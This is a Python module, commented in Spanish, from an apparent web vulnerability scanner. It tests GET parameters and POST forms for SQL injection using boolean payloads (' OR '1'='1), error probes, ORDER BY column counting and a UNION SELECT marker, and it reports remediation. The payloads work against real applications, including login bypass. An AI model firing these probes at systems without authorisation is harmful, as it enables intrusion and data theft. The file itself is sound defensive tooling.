"""SQL Injection — boolean-based, error-based y confirmación de columnas.

Técnica genérica (no asume el esquema de una app en particular):

1. Boolean-based: se compara la respuesta a una condición verdadera
   (`' OR '1'='1`) contra una falsa (`' OR '1'='2`). Si el contenido
   difiere de forma significativa, la lógica del SQL se está alterando
   desde el input -> vulnerable.

2. Error-based: se manda una comilla suelta y se buscan firmas de error
   SQL típicas en la respuesta (útil quan la app no atrapa la excepción).

3. Confirmación de columnas vía "ORDER BY oracle": en vez de intentar un
   UNION SELECT a ciegas (que rompe si los nombres de columna no calzan
   con lo que el template espera), se prueba `ORDER BY N` incrementando
   N. Mientras N sea <= número real de columnas, la respuesta se ve igual
   que la condición verdadera; en cuanto N excede ese número, la consulta
   falla y la respuesta cae al tamaño de la condición falsa. El punto de
   quiebre revela el número de columnas sin depender del esquema del
   template. Con ese número, se intenta -best effort- un UNION SELECT con
   un marcador único para ver si se refleja literalmente en el HTML.
"""
from __future__ import annotations

import random
import string

from bopz.checks.base import Check, Severity

SQL_ERROR_SIGNATURES = [
    "sqlite3.operationalerror", "unrecognized token", "sqlite_error", "sqlite syntax",
    "you have an error in your sql syntax", "mysql_fetch", "warning: mysql",
    "pg_query()", "postgresql error", "ora-01756",
    "microsoft ole db provider for sql server", "unclosed quotation mark",
    "quoted string not properly terminated",
]


def _looks_like_sql_error(text: str) -> bool:
    low = text.lower()
    return any(sig in low for sig in SQL_ERROR_SIGNATURES)


def _random_marker() -> str:
    return "bopz" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


class SqliCheck(Check):
    id_prefix = "SQLI"
    name = "Inyección SQL (boolean-based, error-based, UNION)"

    MAX_UNION_COLUMNS = 15

    def run(self) -> list:
        self._check_get_params()
        self._check_post_forms()
        return self.findings

    # ---------------- GET ?param= ----------------
    def _check_get_params(self) -> None:
        for base_url, params in self.sitemap.query_params.items():
            for param in params:
                self._probe_get_param(base_url, param)

    def _probe_get_param(self, base_url: str, param: str) -> None:
        true_payload = "zzz%' OR '1'='1"
        false_payload = "zzz%' OR '1'='2"
        r_true = self.session.get(base_url, params={param: true_payload})
        r_false = self.session.get(base_url, params={param: false_payload})
        if r_true is None or r_false is None:
            return

        error_resp = self.session.get(base_url, params={param: "bopz'\""})
        error_hit = error_resp is not None and _looks_like_sql_error(error_resp.text)
        boolean_hit = abs(len(r_true.text) - len(r_false.text)) > 15

        if not (boolean_hit or error_hit):
            return

        evidence = [
            f"GET {param}={true_payload}  -> {len(r_true.text)} bytes",
            f"GET {param}={false_payload} -> {len(r_false.text)} bytes",
        ]
        severity = Severity.MEDIUM
        column_count = None
        marker = None

        if boolean_hit:
            severity = Severity.HIGH
            column_count = self._discover_column_count(
                base_url, param, len(r_true.text), len(r_false.text)
            )
            if column_count:
                evidence.append(f"ORDER BY oracle -> {column_count} columnas confirmadas")
                marker = self._try_union_marker(base_url, param, column_count)
                if marker:
                    severity = Severity.CRITICAL
                    evidence.append(
                        f"UNION SELECT con {column_count} columnas -> marcador "
                        f"'{marker}' reflejado literalmente en la respuesta"
                    )
        if error_hit:
            evidence.append("Firma de error SQL detectada en la respuesta a comilla suelta")

        self.add(
            title=f"SQL Injection en parámetro GET '{param}'",
            severity=severity,
            cwe="CWE-89",
            url=f"{base_url}?{param}=...",
            param=param,
            evidence="\n".join(evidence),
            description=(
                "El parámetro se concatena en una consulta SQL sin sentencias "
                "preparadas. Un boolean-based diff confirma que la lógica del "
                "WHERE puede alterarse desde el input" +
                (f", y se confirmó explotabilidad completa vía UNION SELECT "
                 f"({column_count} columnas)." if marker else ".")
            ),
            remediation=(
                "Reemplazar la concatenación por consultas parametrizadas "
                "(placeholders `?`) y validar/normalizar el input del lado del servidor."
            ),
        )

    def _discover_column_count(self, base_url, param, len_true, len_false):
        threshold = (len_true + len_false) / 2
        last_good = None
        for n in range(1, self.MAX_UNION_COLUMNS + 1):
            payload = f"zzz%' OR '1'='1' ORDER BY {n}-- "
            resp = self.session.get(base_url, params={param: payload})
            if resp is None:
                break
            if len(resp.text) >= threshold:
                last_good = n
            else:
                break
        return last_good

    def _try_union_marker(self, base_url, param, column_count):
        marker = _random_marker()
        cols = ",".join([f"'{marker}'"] * column_count)
        payload = f"zzzz_bopz_nomatch' UNION SELECT {cols}-- "
        resp = self.session.get(base_url, params={param: payload})
        if resp is not None and marker in resp.text:
            return marker
        return None

    # ---------------- POST forms (p.ej. login) ----------------
    def _check_post_forms(self) -> None:
        for form in self.sitemap.forms:
            if form.method != "POST":
                continue
            field_names = [i["name"] for i in form.inputs if i.get("name")]
            for target_field in field_names:
                self._probe_post_field(form, target_field, field_names)

    def _probe_post_field(self, form, target_field: str, field_names: list[str]) -> None:
        def build(value: str) -> dict:
            data = {name: "bopz_x" for name in field_names}
            data[target_field] = value
            return data

        r_true = self.session.post(form.action, data=build("zzz' OR '1'='1"))
        r_false = self.session.post(form.action, data=build("zzz' OR '1'='2"))
        if r_true is None or r_false is None:
            return

        signal = (
            r_true.status_code != r_false.status_code
            or r_true.url != r_false.url
            or abs(len(r_true.text) - len(r_false.text)) > 20
        )
        if not signal:
            return

        self.add(
            title=f"Posible SQL Injection / bypass en campo POST '{target_field}'",
            severity=Severity.CRITICAL,
            cwe="CWE-89",
            url=form.action,
            param=target_field,
            evidence=(
                f"POST {target_field}=zzz' OR '1'='1  -> status {r_true.status_code}, "
                f"redirige a {r_true.url}, {len(r_true.text)} bytes\n"
                f"POST {target_field}=zzz' OR '1'='2  -> status {r_false.status_code}, "
                f"redirige a {r_false.url}, {len(r_false.text)} bytes"
            ),
            description=(
                "La respuesta cambia significativamente entre una condición SQL "
                "verdadera y una falsa en este campo (status, URL final o tamaño), "
                "lo que sugiere concatenación directa en una consulta -por ejemplo, "
                "un login construido con f-strings/concatenación en vez de parámetros."
            ),
            remediation=(
                "Usar consultas parametrizadas y verificar contraseñas con hash "
                "(werkzeug.security.check_password_hash), nunca en texto plano."
            ),
        )
